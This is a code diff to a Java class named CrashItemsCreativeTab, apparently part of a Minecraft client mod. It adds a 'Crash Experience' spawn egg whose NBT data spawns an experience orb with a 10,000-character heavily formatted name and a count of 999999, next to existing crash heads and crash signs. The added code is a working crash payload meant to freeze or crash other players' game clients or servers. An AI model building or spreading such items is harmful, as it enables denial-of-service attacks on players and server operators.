@@ -74,7 +74,6 @@ public class CrashItemsCreativeTab extends CreativeTab {
                     )
             );
             current.add(crashHeadV2);
-
         }
         if (targetVersion.isOlderThan(VersionEnum.r1_15)) {
             final ItemStack crashSign = new ItemStack(Items.OAK_SIGN);
@@ -116,7 +115,26 @@ public class CrashItemsCreativeTab extends CreativeTab {
             );
             current.add(crashSignV2);
         }
-
+        final ItemStack crashEXPSpawnEgg = new ItemStack(Items.SHEEP_SPAWN_EGG);
+        final NbtCompound crashEXPSpawnEggNBT = new NbtCompound();
+        final NbtCompound crashEXPSpawnEggEntityTag = new NbtCompound();
+        crashEXPSpawnEggEntityTag.putString("CustomName", Text.Serializer.toJson(Text.literal("#".repeat(10000)).formatted(
+                Formatting.DARK_GREEN, Formatting.BOLD, Formatting.UNDERLINE, Formatting.STRIKETHROUGH, Formatting.ITALIC, Formatting.OBFUSCATED)
+        ));
+        crashEXPSpawnEggEntityTag.putInt("Value", 1337);
+        crashEXPSpawnEggEntityTag.putInt("Count", 999999);
+        crashEXPSpawnEggEntityTag.putByte("CustomNameVisible", (byte) 1);
+        crashEXPSpawnEggEntityTag.putByte("Glowing", (byte) 1);
+        crashEXPSpawnEggEntityTag.putByte("HasVisualFire", (byte) 1);
+        crashEXPSpawnEggEntityTag.putString("id", "minecraft:experience_orb");
+        crashEXPSpawnEggNBT.put("EntityTag", crashEXPSpawnEggEntityTag);
+        crashEXPSpawnEgg.setNbt(crashEXPSpawnEggNBT);
+        this.putClientsideName(crashEXPSpawnEgg,
+                Text.literal(
+                        Formatting.DARK_RED + Formatting.BOLD.toString() + "Crash Experience"
+                )
+        );
+        current.add(crashEXPSpawnEgg);
         return current;
     }
 
